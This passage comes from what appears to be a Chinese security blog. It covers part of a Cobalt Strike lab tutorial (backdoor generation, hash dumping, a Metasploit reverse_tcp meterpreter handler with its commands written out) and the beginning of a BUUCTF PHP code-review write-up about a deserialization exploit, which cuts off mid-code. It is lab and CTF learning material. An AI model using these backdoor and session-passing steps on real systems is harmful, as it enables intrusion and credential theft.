class="headerlink" title="4.4.2 win7"></a>4.4.2 win7</h3><p>è¿è¡Œ<code>cobalstrike.bat</code>ï¼Œç„¶åé…ç½®å³å¯ã€‚</p><h1 id="äº”ã€åŸºç¡€ä½¿ç”¨"><a href="#äº”ã€åŸºç¡€ä½¿ç”¨" class="headerlink" title="äº”ã€åŸºç¡€ä½¿ç”¨"></a>äº”ã€åŸºç¡€ä½¿ç”¨</h1><h2 id="5-1-åˆ›å»ºç›‘å¬å™¨"><a href="#5-1-åˆ›å»ºç›‘å¬å™¨" class="headerlink" title="5.1 åˆ›å»ºç›‘å¬å™¨"></a>5.1 åˆ›å»ºç›‘å¬å™¨</h2><p>é€‰æ‹©<code>ç›‘å¬å™¨</code>åŠŸèƒ½ï¼š</p><img src="/2025/02/17/gong-fang-gong-ju-ku/cobaltstrike/%E6%88%AA%E5%B1%8F2025-02-17%2013.24.11.png" style="zoom:50%;"><p>ä¸‹æ–¹ä¼šå‡ºç°ä¸€ä¸ª<code>ç›‘å¬å™¨X</code>çš„é¢æ¿ï¼š</p><img src="/2025/02/17/gong-fang-gong-ju-ku/cobaltstrike/%E6%88%AA%E5%B1%8F2025-02-17%2013.25.05.png" style="zoom:50%;"><p>ç‚¹å‡»<code>Add</code>å¯ä»¥æ·»åŠ ä¸€ä¸ªç›‘å¬å™¨ï¼š</p><img src="/2025/02/17/gong-fang-gong-ju-ku/cobaltstrike/%E6%88%AA%E5%B1%8F2025-02-17%2013.28.29.png" style="zoom:50%;"><p>åå­—è‡ªå®šä¹‰ã€payloadä¹Ÿå¯ä»¥æ ¹æ®æƒ…å†µé€‰æ‹©ã€ä¸»æœºå¡«CSæœåŠ¡ç«¯çš„IPã€ç«¯å£è‡ªå®šä¹‰ã€‚</p><img src="/2025/02/17/gong-fang-gong-ju-ku/cobaltstrike/%E6%88%AA%E5%B1%8F2025-02-17%2013.30.17.png" style="zoom:50%;"><p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œç›‘å¬å™¨å·²ç»å¼€å¯ç›‘å¬ã€‚</p><h2 id="5-2-win7ä¸Šçº¿"><a href="#5-2-win7ä¸Šçº¿" class="headerlink" title="5.2 win7ä¸Šçº¿"></a>5.2 win7ä¸Šçº¿</h2><ul><li>ç”Ÿæˆåé—¨ï¼š</li></ul><img src="/2025/02/17/gong-fang-gong-ju-ku/cobaltstrike/%E6%88%AA%E5%B1%8F2025-02-17%2013.31.42.png" style="zoom:50%;"><p>æŒ‰ç…§ä¸Šé¢çš„æŒ‡å¼•é€‰æ‹©<code>Windows Executable</code>æ¨¡å—ã€‚</p><img src="/2025/02/17/gong-fang-gong-ju-ku/cobaltstrike/%E6%88%AA%E5%B1%8F2025-02-17%2013.33.19.png" style="zoom:50%;"><p>é€‰æ‹©åˆšåˆšåˆ›å»ºçš„ç›‘å¬å™¨ï¼Œç‚¹å‡»generateç”Ÿæˆåé—¨ã€‚</p><img src="/2025/02/17/gong-fang-gong-ju-ku/cobaltstrike/%E6%88%AA%E5%B1%8F2025-02-17%2013.34.28.png" style="zoom:50%;"><p>å°†åé—¨æ–‡ä»¶æŠ•é€’åˆ°win7ä¸Šï¼Œæ‰§è¡Œï¼š</p><img src="/2025/02/17/gong-fang-gong-ju-ku/cobaltstrike/%E6%88%AA%E5%B1%8F2025-02-17%2013.35.29.png" style="zoom:50%;"><img src="/2025/02/17/gong-fang-gong-ju-ku/cobaltstrike/%E6%88%AA%E5%B1%8F2025-02-17%2013.36.17.png" style="zoom:50%;"><p>win7æˆåŠŸä¸Šçº¿CSã€‚</p><img src="/2025/02/17/gong-fang-gong-ju-ku/cobaltstrike/%E6%88%AA%E5%B1%8F2025-02-17%2013.36.45.png" style="zoom:50%;"><h2 id="5-3-è½¬å‚¨å“ˆå¸Œ"><a href="#5-3-è½¬å‚¨å“ˆå¸Œ" class="headerlink" title="5.3 è½¬å‚¨å“ˆå¸Œ"></a>5.3 è½¬å‚¨å“ˆå¸Œ</h2><p>win7ä¸Šçº¿ä¹‹åï¼Œå³é”®å¯ä»¥æ‰§è¡Œå¾ˆå¤šæ“ä½œï¼š</p><img src="/2025/02/17/gong-fang-gong-ju-ku/cobaltstrike/%E6%88%AA%E5%B1%8F2025-02-17%2013.39.52.png" style="zoom:50%;"><p>æ¯”å¦‚è½¬å‚¨Hashï¼š</p><img src="/2025/02/17/gong-fang-gong-ju-ku/cobaltstrike/%E6%88%AA%E5%B1%8F2025-02-17%2013.40.36.png" style="zoom:50%;"><img src="/2025/02/17/gong-fang-gong-ju-ku/cobaltstrike/%E6%88%AA%E5%B1%8F2025-02-17%2013.40.55.png" style="zoom:50%;"><h2 id="5-4-è”åŠ¨MSF"><a href="#5-4-è”åŠ¨MSF" class="headerlink" title="5.4 è”åŠ¨MSF"></a>5.4 è”åŠ¨MSF</h2><ul><li>åœ¨kaliä¸­å¯åŠ¨msfï¼Œå¼€å¯ç›‘å¬</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfconsoleuse exploit/multi/handler<span class="token builtin class-name">set</span> payload windows/meterpreter/reverse_tcp<span class="token builtin class-name">set</span> lhost <span class="token number">172.20</span>.10.4 ã€kaliï¼ˆCSæœåŠ¡ç«¯ï¼‰ipã€‘<span class="token builtin class-name">set</span> lport <span class="token number">7777</span>run <span class="token parameter variable">-j</span> ã€æ˜¯ä¸€ä¸ªå¸¸ç”¨çš„å‘½ä»¤é€‰é¡¹ï¼Œç”¨äºåœ¨åå°è¿è¡Œæ¨¡å—ã€‚ã€‘<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‰§è¡Œä¹‹åï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> run <span class="token parameter variable">-j</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Exploit running as background job <span class="token number">0</span>.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Exploit completed, but no session was created.<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">172.20</span>.10.4:7777 msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> show options Module options <span class="token punctuation">(</span>exploit/multi/handler<span class="token punctuation">)</span>:   Name  Current Setting  Required  Description   ----  ---------------  --------  -----------Payload options <span class="token punctuation">(</span>windows/meterpreter/reverse_tcp<span class="token punctuation">)</span>:   Name      Current Setting  Required  Description   ----      ---------------  --------  -----------   EXITFUNC  process          <span class="token function">yes</span>       Exit technique <span class="token punctuation">(</span>Accepted: <span class="token string">''</span>, seh, thread, process, none<span class="token punctuation">)</span>   LHOST     <span class="token number">172.20</span>.10.4      <span class="token function">yes</span>       The listen address <span class="token punctuation">(</span>an interface may be specified<span class="token punctuation">)</span>   LPORT     <span class="token number">7777</span>             <span class="token function">yes</span>       The listen portExploit target:   Id  Name   --  ----   <span class="token number">0</span>   Wildcard Targetmsf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>åœ¨CSå®¢æˆ·ç«¯ä¸­åˆ›å»ºä¸€ä¸ªå¤–éƒ¨ç›‘å¬</li></ul><p>ä½¿ç”¨Cobalt Strikeåˆ›å»ºä¸€ä¸ªwindows/foreign/reverse_tcpçš„Listenerã€‚å…¶ä¸­ipä¸ºMetasploitçš„ipåœ°å€ï¼Œç«¯å£ä¸ºMetasploitæ‰€ç›‘å¬çš„ç«¯å£ã€‚</p><img src="/2025/02/17/gong-fang-gong-ju-ku/cobaltstrike/%E6%88%AA%E5%B1%8F2025-02-17%2014.01.33.png" style="zoom:50%;"><img src="/2025/02/17/gong-fang-gong-ju-ku/cobaltstrike/%E6%88%AA%E5%B1%8F2025-02-17%2014.02.03.png" style="zoom:50%;"><p>åœ¨å·²ä¸Šçº¿çš„ä¼šè¯ä¸­ï¼Œå³é”®ç‚¹å‡»æ´¾ç”Ÿä¼šè¯ï¼š</p><img src="/2025/02/17/gong-fang-gong-ju-ku/cobaltstrike/%E6%88%AA%E5%B1%8F2025-02-17%2014.03.08.png" style="zoom:50%;"><p>ç„¶åé€‰æ‹©åˆšåˆšåˆ›å»ºçš„<code>msf</code>ä¼šè¯ã€‚</p><img src="/2025/02/17/gong-fang-gong-ju-ku/cobaltstrike/%E6%88%AA%E5%B1%8F2025-02-17%2014.03.55.png" style="zoom:50%;"><p>åœ¨msfconsoleä¸­è·å–åˆ°ç›¸åº”çš„ä¼šè¯è¿æ¥ï¼š</p><img src="/2025/02/17/gong-fang-gong-ju-ku/cobaltstrike/%E6%88%AA%E5%B1%8F2025-02-17%2014.06.21.png" style="zoom:67%;"><img src="/2025/02/17/gong-fang-gong-ju-ku/cobaltstrike/%E6%88%AA%E5%B1%8F2025-02-17%2014.14.20.png" style="zoom:50%;"><p>åç»­ä¹Ÿå¯åˆ©ç”¨msfä¸­çš„å·¥å…·è¿›è¡Œè¿›ä¸€æ­¥æ¸—é€ã€‚</p><h1 id="å­¦ä¹ èµ„æ–™"><a href="#å­¦ä¹ èµ„æ–™" class="headerlink" title="å­¦ä¹ èµ„æ–™"></a>å­¦ä¹ èµ„æ–™</h1><ul><li><a href="https://github.com/aleenzz/Cobalt_Strike_wiki/">https://github.com/aleenzz/Cobalt_Strike_wiki/</a></li><li><a href="https://github.com/Snowming04/CobaltStrike4.0_related">https://github.com/Snowming04/CobaltStrike4.0_related</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> æ”»é˜²å·¥å…·åº“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ”»é˜²å·¥å…·åº“ </tag>
            
            <tag> CS </tag>
            
            <tag> CobaltStrike </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web-buuoj-(BUU CODE REVIEW 1)</title>
      <link href="/2025/02/14/ctf-shi-zhan/web-buuoj-buu-code-review-1/"/>
      <url>/2025/02/14/ctf-shi-zhan/web-buuoj-buu-code-review-1/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€é¢˜é¢"><a href="#ä¸€ã€é¢˜é¢" class="headerlink" title="ä¸€ã€é¢˜é¢"></a>ä¸€ã€é¢˜é¢</h1><img src="/2025/02/14/ctf-shi-zhan/web-buuoj-buu-code-review-1/image-20250213194944396.png" style="zoom:77%;"><img src="/2025/02/14/ctf-shi-zhan/web-buuoj-buu-code-review-1/image-20250213195145378.png" style="zoom:80%;"><p>è®¿é—®æœåŠ¡å™¨ï¼Œè¿”å›ä¸€æ®µphpä»£ç ï¼Œè€ƒå¯Ÿä»£ç å®¡è®¡ã€‚</p><h1 id="äºŒã€åˆ†æ"><a href="#äºŒã€åˆ†æ" class="headerlink" title="äºŒã€åˆ†æ"></a>äºŒã€åˆ†æ</h1><h2 id="2-1-ä»£ç å®¡è®¡"><a href="#2-1-ä»£ç å®¡è®¡" class="headerlink" title="2.1 ä»£ç å®¡è®¡"></a>2.1 ä»£ç å®¡è®¡</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/** * Created by PhpStorm. * User: jinzhao * Date: 2019/10/6 * Time: 8:04 PM */</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">BUU</span> <span class="token punctuation">{</span>   <span class="token keyword">public</span> <span class="token variable">$correct</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>   <span class="token keyword">public</span> <span class="token variable">$input</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>   <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>       <span class="token keyword">try</span> <span class="token punctuation">{</span>           <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">correct</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">uniqid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">correct</span> <span class="token operator">===</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">input</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>               <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token punctuation">}</span>       <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>       <span class="token punctuation">}</span>   <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pleaseget'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'1'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pleasepost'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'2'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'md51'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'md52'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'md51'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'md52'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'obj'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>     <span class="token punctuation">}</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åˆ†æä»£ç è¦æƒ³è·å¾—flagéœ€è¦æ»¡è¶³å¦‚ä¸‹çš„æ¡ä»¶ï¼š</p><ul><li><p>1ï¼‰ä¼ é€’GETå‚æ•° pleaseget=1ï¼Œä¼ é€’POSTå‚æ•°pleasepost=2</p></li><li><p>2ï¼‰ä¼ é€’ä¸¤ä¸ªPOSTå‚æ•°md51å’Œmd52ï¼Œä¸¤ä¸ªå€¼ä¸åŒï¼Œä½†æ˜¯md5()ç»“æœå¼±ç›¸ç­‰ã€‚</p></li><li><p>3ï¼‰ç„¶åä¸“é€’POSTå‚æ•°objï¼Œé€šè¿‡ååºåˆ—åŒ–ä¹‹åï¼Œcorrectçš„å€¼===inputçš„å€¼ã€‚</p></li></ul><p>å‰ä¸¤ä¸ªæ¡ä»¶æ¯”è¾ƒå®¹æ˜“ï¼Œç¬¬ä¸‰ä¸ªæ¡ä»¶å¦‚ä½•æ„å»ºå‘¢ï¼Ÿ</p><p><code>base64_encode(uniqid())</code> çš„ä½œç”¨æ˜¯ç”Ÿæˆä¸€ä¸ªå”¯ä¸€çš„ IDï¼Œç„¶åå°†å…¶è½¬æ¢ä¸º Base64 ç¼–ç çš„å­—ç¬¦ä¸²ã€‚å¦‚ä½•è®©inputçš„å€¼===correctçš„å€¼å‘¢ï¼Ÿ</p><p>ä¸ºäº†æµ‹è¯•BUUç±»åºåˆ—åŒ–åçš„å†…å®¹ï¼Œåœ¨win10ä¸Šå®‰è£…phpï¼š</p><blockquote><h4 id="win10å®‰è£…php"><a href="#win10å®‰è£…php" class="headerlink" title="win10å®‰è£…php"></a>win10å®‰è£…php</h4><ul><li><p>1ã€è®¿é—®<a href="https://windows.php.net/download/">PHP for Windows</a>å®˜ç½‘ï¼Œä¸‹è½½x64 Thread Safeçš„ZIPå®‰è£…åŒ…ã€‚</p></li><li><p>2ã€è§£å‹å®‰è£…åŒ…ï¼Œå¹¶é…ç½®ç¯å¢ƒå˜é‡ã€‚</p><ol><li>å³é”®ç‚¹å‡»â€œæ­¤ç”µè„‘â€æˆ–â€œæˆ‘çš„ç”µè„‘â€ï¼Œé€‰æ‹©â€œå±æ€§â€ã€‚</li><li>ç‚¹å‡»â€œé«˜çº§ç³»ç»Ÿè®¾ç½®â€ã€‚</li><li>åœ¨â€œç³»ç»Ÿå±æ€§â€çª—å£ä¸­ï¼Œç‚¹å‡»â€œç¯å¢ƒå˜é‡â€æŒ‰é’®ã€‚</li><li>åœ¨â€œç³»ç»Ÿå˜é‡â€åŒºåŸŸæ‰¾åˆ°â€œPathâ€å˜é‡ï¼Œç‚¹å‡»â€œç¼–è¾‘â€ã€‚</li><li>åœ¨ç¼–è¾‘çª—å£ä¸­ç‚¹å‡»â€œæ–°å»ºâ€ï¼Œç„¶åæ·»åŠ PHPçš„å®‰è£…ç›®å½•ï¼ˆä¾‹å¦‚<code>D:\php</code>ï¼‰å’ŒPHPçš„æ‰©å±•ç›®å½•ï¼ˆä¾‹å¦‚<code>D:\php\ext</code>ï¼‰ã€‚</li></ol><img src="/2025/02/14/ctf-shi-zhan/web-buuoj-buu-code-review-1/image-20250213201238643.png" style="zoom:80%;"></li><li><p>3ã€é…ç½®php.iniæ–‡ä»¶ï¼šphp.iniæ˜¯PHPçš„é…ç½®æ–‡ä»¶ï¼Œä¸»è¦ç”¨äºæ§åˆ¶PHPè§£é‡Šå™¨çš„è¡Œä¸ºå’ŒåŠŸèƒ½ã€‚</p><p>åœ¨è§£å‹æ–‡ä»¶å¤¹ä¸­æ‰¾åˆ°php.ini-developmentï¼Œå®ƒä¸€èˆ¬ç”¨äºå¼€å‘ç¯å¢ƒï¼Œå°†æ–‡ä»¶é‡å‘½åä¸ºphp.iniã€‚</p></li><li><p>4ã€éªŒè¯æ˜¯å¦å®‰è£…æˆåŠŸï¼šåŒæ—¶æŒ‰ä¸‹<code>Win+Ré”®</code>è¾“å…¥<code>cmd</code>æ‰“å¼€å‘½ä»¤è¡Œï¼Œåœ¨å‘½ä»¤è¡Œè¾“å…¥<code>php -v</code>ï¼Œå¦‚æœå‡ºç°å¦‚ä¸‹æ‰€ç¤ºçš„ä¿¡æ¯ï¼Œåˆ™è¡¨ç¤ºå®‰è£…æˆåŠŸã€‚</p></li></ul><p>â€‹    æŠ¥é”™ï¼š</p><blockquote><p>PHP Warning:  â€˜C:\Windows\SYSTEM32\VCRUNTIME140.dllâ€™ 14.36 is not compatible with this PHP build linked with 14.42 in Unknown on line 0</p></blockquote><p>â€‹    åŸå› æ˜¯<em>VCRUNTIME140.dll</em>ä¸PHPç‰ˆæœ¬ä¸å…¼å®¹ã€‚</p><p>â€‹    ä¸¤ç§è§£å†³æ–¹æ³•ï¼š</p><p>1ï¼‰éœ€è¦è®¿é—®<a href="https://visualstudio.microsoft.com/zh-hans/downloads/">ä¸‹è½½ Windows ç‰ˆå’Œ Mac ç‰ˆ Visual Studio 2019</a>è¿›è¡Œä¸‹è½½ã€‚</p><img src="/2025/02/14/ctf-shi-zhan/web-buuoj-buu-code-review-1/image-20250213201754584.png" style="zoom:80%;"><p>â€‹     å®‰è£…å®Œæ¯•ä»æ–°å¯åŠ¨å³å¯ã€‚</p><p>2ï¼‰ä¸‹è½½å®‰è£…è€ç‰ˆæœ¬çš„phpï¼Œæ¯”å¦‚php7ã€‚</p><p>â€‹     <a href="https://windows.php.net/downloads/releases/archives/">https://windows.php.net/downloads/releases/archives/</a> è¿™é‡Œæœ‰ä»¥å¾€çš„phpç‰ˆæœ¬ã€‚</p><img src="/2025/02/14/ctf-shi-zhan/web-buuoj-buu-code-review-1/image-20250213202032648.png" style="zoom:100%;"><p>â€‹    è¿™é‡Œæˆ‘é€‰æ‹©äº†php 7.3.30ï¼Œæ²¡ä»€ä¹ˆç†ç”±ï¼Œçœ‹ç€é¡ºçœ¼ã€‚åŒæ ·çš„æ“ä½œå®‰è£…ä¸€ä¸‹ã€‚</p><img src="/2025/02/14/ctf-shi-zhan/web-buuoj-buu-code-review-1/image-20250213202513752.png" style="zoom:100%;"><p>â€‹    æµ‹è¯•ä¸€ä¸‹ï¼Œå®‰è£…æˆåŠŸäº†ã€‚</p><img src="/2025/02/14/ctf-shi-zhan/web-buuoj-buu-code-review-1/image-20250213202555120.png" style="zoom:80%;"></blockquote><h2 id="2-2-BUUç±»åˆ†æ"><a href="#2-2-BUUç±»åˆ†æ" class="headerlink" title="2.2 BUUç±»åˆ†æ"></a>2.2 BUUç±»åˆ†æ</h2><p>ç¼–å†™phpæµ‹è¯•ä»£ç ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">BUU</span> <span class="token punctuation">{</span>   <span class="token keyword">public</span> <span class="token variable">$correct</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>   <span class="token keyword">public</span> <span class="token variable">$input</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>   <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>       <span class="token keyword">try</span> <span class="token punctuation">{</span>           <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">correct</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">uniqid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">correct</span> <span class="token operator">===</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">input</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>               <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token punctuation">}</span>       <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>       <span class="token punctuation">}</span>   <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BUU</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$serialize_obj</span><span class="token operator">=</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$serialize_obj</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n\n"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"----------------------------------------\n"</span><span class="token punctuation">;</span><span class="token variable">$obj_str</span><span class="token operator">=</span><span class="token string single-quoted-string">'O:3:"BUU":2:{s:7:"correct";s:0:"";s:5:"input";s:0:"";}'</span><span class="token punctuation">;</span><span class="token variable">$obj2</span><span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$obj_str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$obj2</span><span class="token punctuation">)</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2025/02/14/ctf-shi-zhan/web-buuoj-buu-code-review-1/image-20250213204824163.png" style="zoom:80%;"><p>åºåˆ—åŒ–ç©ºå¯¹è±¡åçš„å­—ç¬¦ä¸²ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">O:3:<span class="token string">"BUU"</span>:2:<span class="token punctuation">{</span>s:7:<span class="token string">"correct"</span><span class="token punctuation">;</span>s:0:<span class="token string">""</span><span class="token punctuation">;</span>s:5:<span class="token string">"input"</span><span class="token punctuation">;</span>s:0:<span class="token string">""</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ååºåˆ—åŒ–åvar_dumpè¾“å‡ºçš„å¯¹è±¡ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">object<span class="token punctuation">(</span>BUU<span class="token punctuation">)</span><span class="token comment">#2 (2) {</span>  <span class="token punctuation">[</span><span class="token string">"correct"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&gt;</span>  string<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token string">""</span>  <span class="token punctuation">[</span><span class="token string">"input"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">&gt;</span>  string<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token string">""</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¦‚ä½•æ‰èƒ½è®©å¯¹è±¡ææ„çš„æ—¶å€™correctçš„å€¼å’Œinputçš„å€¼ç›¸åŒå‘¢ï¼Ÿ</p><p>æ ¸å¿ƒï¼š<code>è®©inputçš„å€¼æŒ‡å‘correct</code>ã€‚**(å€ŸåŠ©å¤–éƒ¨æç¤º)**</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$obj</span><span class="token operator">-&gt;</span><span class="token property">input</span> <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token variable">$obj</span><span class="token operator">-&gt;</span><span class="token property">correct</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-3-input-correctçš„æ¡ä»¶"><a href="#2-3-input-correctçš„æ¡ä»¶" class="headerlink" title="2.3 input==correctçš„æ¡ä»¶"></a>2.3 input==correctçš„æ¡ä»¶</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">BUU</span> <span class="token punctuation">{</span>   <span class="token keyword">public</span> <span class="token variable">$correct</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>   <span class="token keyword">public</span> <span class="token variable">$input</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>   <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>       <span class="token keyword">try</span> <span class="token punctuation">{</span>           <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">correct</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">uniqid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">correct</span> <span class="token operator">===</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">input</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>               <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token punctuation">}</span>       <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>       <span class="token punctuation">}</span>   <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BUU</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$obj</span><span class="token operator">-&gt;</span><span class="token property">input</span> <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token variable">$obj</span><span class="token operator">-&gt;</span><span 